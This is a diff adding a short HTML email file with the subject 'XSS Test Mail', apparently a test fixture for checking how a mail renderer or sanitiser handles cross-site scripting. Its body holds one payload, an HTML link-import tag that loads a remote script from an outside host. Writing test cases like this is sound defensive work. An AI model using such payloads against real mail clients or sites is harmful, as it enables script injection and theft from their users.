@@ -1,0 +1,7 @@
+From: karen.buckley@enron.com
+To: kckrisa@apex2000.net, jjosborne@apex2000.net, mark.whitt@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
